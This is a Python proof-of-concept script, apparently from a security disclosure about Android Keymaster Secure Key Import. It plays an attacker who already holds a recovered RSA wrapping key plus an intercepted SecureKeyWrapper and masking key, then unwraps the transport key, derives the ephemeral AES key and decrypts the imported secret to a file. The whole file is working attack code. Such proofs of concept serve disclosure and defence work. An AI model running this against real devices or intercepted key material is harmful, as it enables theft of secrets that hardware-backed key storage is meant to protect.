from binascii import hexlify

import logging
import click

from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Hash import SHA256, SHA1
from Crypto.Signature import pss

from poc_asn1 import decode_secure_key_wrapper

logging.basicConfig(format='[%(levelname)s] %(message)s', level=logging.DEBUG)


def unwrap(wrapping_key_private, ciphertext):
    """
    RSA-OAEP key unwrapping.

    Args:
        wrapping_key_private: The recovered private key material of the wrapping key
        ciphertext: The ciphtertext to unwrap
    """
    rsa_cipher = PKCS1_OAEP.new(
        key=wrapping_key_private, hashAlgo=SHA256, mgfunc=lambda x, y: pss.MGF1(x, y, SHA1))
    return rsa_cipher.decrypt(ciphertext)


def decrypt_and_verify(key, iv, ciphertext, tag):
    """
    AES-GCM decryption.

    Args:
        key: The AES encryption key
        iv: The AES initialization vector
        plaintext: The plaintext to encrypt
    """
    aes_cipher = AES.new(key, AES.MODE_GCM, iv)
    return aes_cipher.decrypt_and_verify(ciphertext, tag)


def emulate_attacker(wrapping_key_private, encoded_secure_key_wrapper, xor_mask):
    """
    Emulate the attacker after recovering the wrapping key and intercepting SecureKeyWrapper during Secure Key Import.

    The attacker simply performs the final step of Secure Key Import by himself.

    See the disclosure and https://android.googlesource.com/platform/hardware/interfaces/+/master/keymaster/4.0/IKeymasterDevice.hal#548.

    Args:
        wrapping_key_private: The recovered private RSA wrapping key (from IV reuse attack).
        encoded_secure_key_wrapper: Intercepted SecureKeyWrapper ASN1 (e.g. from app or from network).
        xor_mask: Intercepted maskingKey (e.g. from app or from network).
    """
    secure_key_wrapper, _ = decode_secure_key_wrapper(encoded_secure_key_wrapper)

    encrypted_transport_key = secure_key_wrapper['encryptedTransportKey'].asOctets()
    logging.debug(f'encrypted_transport_key: {hexlify(encrypted_transport_key)}')

    iv = secure_key_wrapper['initializationVector'].asOctets()
    logging.debug(f'iv: {hexlify(iv)}')

    encrypted_secret = secure_key_wrapper['encryptedKey'].asOctets()
    logging.debug(f'encrypted_secret: {hexlify(encrypted_secret)}')

    tag = secure_key_wrapper['tag'].asOctets()
    logging.debug(f'tag: {hexlify(tag)}')

    logging.debug(f'unwrapping the transport key with the recovered private RSA wrapping key')
    transport_key = unwrap(wrapping_key_private, encrypted_transport_key)
    logging.debug(f'decrypted transport_key: {hexlify(transport_key)}')

    # xor with mask to get ephermeral key
    ephemeral_key = bytes([transport_key[i] ^ xor_mask[i] for i in range(32)])
    logging.debug(f'ephemeral_key: {hexlify(transport_key)}')

    logging.debug(f'decrypting the secure secret with the AES ephermeral key')
    secret = decrypt_and_verify(ephemeral_key, iv, encrypted_secret, tag)
    logging.info(f'decrypted secret: {hexlify(secret)}')

    return secret


@click.command()
@click.argument('recovered-wrapping-key-path')
@click.argument('secure-key-wrapper-path')
@click.argument('xor-mask-path')
def main(recovered_wrapping_key_path, secure_key_wrapper_path, xor_mask_path):
    """
    Usage: python poc_attacker.py recovered-wrapping_key out mask

    Where out is the SecureKeyWrapper ASN1 created by a remote server (e.g. poc_server.py).
    """
    with open(recovered_wrapping_key_path, 'rb') as f:
        recovered_wrapping_key = f.read()
        wrapping_key_private = RSA.importKey(recovered_wrapping_key)
        logging.debug(f'wrapping_key_private.d: {hex(wrapping_key_private.d)}')

    with open(secure_key_wrapper_path, 'rb') as f:
        encoded_secure_key_wrapper = f.read()

    with open(xor_mask_path, 'rb') as f:
        xor_mask = f.read()

    secret = emulate_attacker(wrapping_key_private, encoded_secure_key_wrapper, xor_mask)

    with open('recovered-secret.bin', 'wb') as f:
        f.write(secret)


if __name__ == '__main__':
    main()
